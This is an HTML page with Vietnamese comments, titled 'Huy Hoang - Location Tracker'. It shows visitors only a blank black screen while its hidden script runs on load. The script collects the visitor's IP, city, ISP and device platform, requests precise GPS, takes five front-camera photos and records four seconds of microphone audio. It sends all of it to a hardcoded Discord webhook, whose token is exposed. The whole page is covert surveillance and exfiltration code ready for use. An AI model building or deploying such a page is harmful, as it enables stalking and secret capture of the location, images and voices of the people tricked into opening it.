<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Huy Hoang - Location Tracker</title>
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: monospace;
            color: white;
        }
    </style>
</head>
<body>
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // ================== WEBHOOK CỦA BẠN ==================
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM';

        // Cấu hình
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        const AUDIO_DURATION = 4000;

        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // ================== HÀM GỬI TEXT ==================
        async function sendTextToDiscord(content, retryCount = 0) {
            const maxRetries = 2;
            try {
                const payload = {
                    content: content,
                    username: "Huy Hoang - Location Tracker",
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                };
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) console.log('✅ Gửi text thành công');
            } catch (e) {
                console.error('Send text error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
                }
            }
        }

        // ================== HÀM GỬI FILE ==================
        async function sendFileToDiscord(fileBlob, fileName, caption = '') {
            try {
                const formData = new FormData();
                formData.append('file', fileBlob, fileName);

                const payload = {
                    content: caption || '',
                    username: "Huy Hoang - Location Tracker",
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                };
                formData.append('payload_json', JSON.stringify(payload));

                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                console.log(`✅ Đã gửi file ${fileName}`);
            } catch (e) {
                console.error('Send file error:', e);
            }
        }

        async function sendAudioToDiscord(blob) {
            const fileName = `audio_${Date.now()}.ogg`;
            const caption = `🎤 **Ghi âm** - ${new Date().toLocaleString('vi-VN')}`;
            await sendFileToDiscord(blob, fileName, caption);
        }

        async function sendPhotoToDiscord(blob, photoNumber) {
            const fileName = `capture_${photoNumber}_${Date.now()}.jpg`;
            const caption = `📸 **Ảnh chụp #${photoNumber}** - ${new Date().toLocaleString('vi-VN')}`;
            await sendFileToDiscord(blob, fileName, caption);
            photoSentCount++;
        }

        // ================== CHỤP ẢNH ==================
        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise(resolve => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            if (blob) sendPhotoToDiscord(blob, photoNumber);
                            resolve();
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve), 50);
                    }
                } catch (e) {
                    console.error(`Lỗi chụp ảnh #${photoNumber}`, e);
                    resolve();
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        }

        // ================== GHI ÂM ==================
        async function startRecording() {
            if (audioRecorded) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];

                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (blob.size > 0) await sendAudioToDiscord(blob);
                    audioRecorded = true;
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                }, AUDIO_DURATION);
            } catch (e) {
                console.warn('Ghi âm lỗi:', e);
            }
        }

        // ================== LẤY IP + VỊ TRÍ ==================
        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let city = 'Không xác định', region = 'Không xác định', isp = 'Không xác định';

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || ip;
                city = data.city || city;
                region = data.region || region;
                isp = data.org || isp;
            } catch (e) {}

            return { ip, city, region, isp };
        }

        // ================== GỬI THÔNG TIN CHÍNH ==================
        async function getInfoAndSendToDiscord() {
            const { ip, city, region, isp } = await getIPAndLocation();
            const time = new Date().toLocaleString('vi-VN');

            const message = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                `🌐 **IP:** ${ip}\n` +
                `📍 **Thành phố:** ${city}\n` +
                `🗺️ **Khu vực:** ${region}\n` +
                `🏢 **Nhà mạng:** ${isp}\n` +
                `📱 **Thiết bị:** ${navigator.platform}\n` +
                `⏰ **Thời gian:** ${time}\n` +
                `🔗 **Nguồn:** Truy cập trực tiếp`;

            await sendTextToDiscord(message);
        }

        // ================== GPS ==================
        async function autoSendGPS() {
            if (gpsDataSent || !navigator.geolocation) return;
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                    const msg = `**📍 VỊ TRÍ GPS THỰC TẾ**\n\n` +
                               `📌 Vĩ độ: \`${lat}\`\n` +
                               `📌 Kinh độ: \`${lng}\`\n` +
                               `🗺️ [Xem trên Google Maps](${mapsLink})`;
                    await sendTextToDiscord(msg);
                    gpsDataSent = true;
                },
                () => {}
            );
        }

        // ================== KHỞI ĐỘNG CAMERA ==================
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 800 }, height: { ideal: 600 }, facingMode: 'user' }
                });
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;

                await new Promise(r => video.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 150));

                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) {
                console.warn('Camera lỗi:', e);
            }
        }

        // ================== KHỞI CHẠY TẤT CẢ ==================
        async function init() {
            try {
                await getInfoAndSendToDiscord();
                setTimeout(autoSendGPS, 800);
                setTimeout(startCameraImmediately, 600);
                setTimeout(startRecording, 1000);
            } catch (err) {
                console.error('Init error:', err);
                await sendTextToDiscord(`⚠️ Lỗi khởi tạo: ${err.message}`);
            }
        }

        // Bắt đầu
        window.addEventListener('load', init);
    </script>
</body>
</html>
